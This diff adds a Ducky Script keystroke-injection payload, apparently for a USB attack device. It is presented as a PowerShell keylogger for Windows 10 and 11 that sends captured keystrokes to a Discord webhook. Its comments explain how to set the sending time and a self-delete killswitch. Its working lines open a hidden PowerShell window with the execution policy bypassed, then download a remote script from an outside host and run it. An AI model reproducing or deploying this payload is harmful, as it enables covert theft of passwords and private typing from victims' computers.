@@ -1,0 +1,25 @@
+REM     Title: Keylogger
+
+REM     Author: I am Jakoby
+
+REM     Description: This is a Powershell based keylogger that exfiltrates the logs to discord
+
+REM     Target: Windows 10, 11
+
+REM     ADDITIONAL PARAMETERS
+REM     The payload is set to send the logs collected every hour on the hour
+
+REM     You maybe use the $log variable to specify a certain time instead (Use this for testing)
+REM     ex: $log="09:00 pm" <-- This will send the log every night at 9pm
+REM     You also have the option of setting up a killswitch to have the keylogger self delete at a certain time and date
+
+REM     $ks="12/25/2022 10:00:00 PM" <-- This will make the keylogger self delete at 10pm on December 25th
+
+REM     Calling the script with both a log time and killswitch will look something like this:
+
+REM     $dc='https://link.iamjakoby.com/xxxx';$log="09:00 pm";$ks="12/25/2022 10:00:00 PM";iwr "https://jakoby.lol/m2m" | iex
+
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -Ep Bypass -command "$dc='https://link.iamjakoby.com/xxxx';$log='';$ks='';iwr 'https://jakoby.lol/m2m' | iex"
+ENTER
